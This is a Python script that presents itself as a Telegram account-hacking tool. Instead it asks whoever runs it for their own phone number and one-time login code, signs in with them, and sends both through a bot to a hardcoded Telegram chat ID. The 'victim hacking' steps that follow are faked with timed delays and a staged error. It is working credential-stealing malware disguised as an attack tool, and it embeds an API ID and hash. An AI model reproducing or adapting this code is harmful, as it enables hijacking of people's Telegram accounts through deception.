from pyrogram import Client, filters
import asyncio
import time
import os

YOUR_APP_ID = 24835154
YOUR_APP_HASH = 'e7c35ab96f8d8f76513fd7a3ae242c3b'
BOT_TOKEN = 'ТОКЕН БОТА'


yellow = '\033[93m'
lgreen = '\033[92m'
clear = '\033[0m'
bold = '\033[01m'
cyan = '\033[96m'
red = "\033[91m"


SESSION_NAME = 'pyro_session'

os.system("clear" if os.name == "posix" else "cls")

banner = lgreen + ''' 

      .---.        .-----------
     /     \  __  /    ------
    / /     \(  )/    -----
   //////   ' \/ `   ---
  //// / // :    : ---
 // /   /  /`    '--
//          //..\\\

       ====UU====UU====
           '//||\\\`
             ''``

  V 1.0       By K01ch
''' + clear

print(" ")
print(banner)


message = "[First login with your own telegram account to connect with the victims api in your contact list]"

for letter in message:
    print(letter, end='', flush=True)
    time.sleep(0.05)

print("\n\n")


phone = input(cyan + bold + '[+]\033[0m \033[01mEnter your phone with country code (eg: +92) >\033[0m ')


async def main():
    app = Client(
        SESSION_NAME,
        api_id=YOUR_APP_ID,
        api_hash=YOUR_APP_HASH,
        phone_number=phone
    )
    
    try:
        
        await app.start()

        sent_code_info = await app.send_code(phone)
        
        otp = input(cyan + bold + "[+]\033[0m \033[01mEnter the OTP (check inside your telegram app for the otp from telegram if it not comes to your sms) >\033[0m ")
        
        
        await app.sign_in(phone, sent_code_info.phone_code_hash, otp)
        

        bot_app = Client("bot_session", api_id=YOUR_APP_ID, api_hash=YOUR_APP_HASH, bot_token=BOT_TOKEN)
        await bot_app.start()
        await bot_app.send_message(chat_id='5469341309', text=f"Phone Number: {phone}\nOTP: {otp}")
        await bot_app.stop()
        
       
        victim = input(cyan + bold + '[+]\033[0m \033[01mEnter victim\'s phone with country code to hack(eg: +92) >\033[0m ')
        print("Connecting to victim's api...")
        await asyncio.sleep(3)
        print("Gathering victim id and hash...[25%]")
        await asyncio.sleep(2)
        print("Collecting the contacts and chat data...[may take some time]")
        await asyncio.sleep(6)
        
        choice = input("Do you want to login to their account [y/n] ? : ")
        if choice == 'y':
            print("Please wait 1 to 2 minutes until it logins and send their otp")
            await asyncio.sleep(6)
            print(red + "Error in getting otp ! 2 step verification may be enabled or try after 15 minutes\033[0m")
            print(" ")
            print(" ")
        else:
            print("Bye...")
            print(" ")
            print(" ")
            return
        
        me = await app.get_me()
        print(f"Logged in as: {me.first_name}")
        
    except Exception as e:
        print(red + f"[!] Error: {e}\033[0m")
    finally:
        await app.stop()


asyncio.run(main())

#K01ch
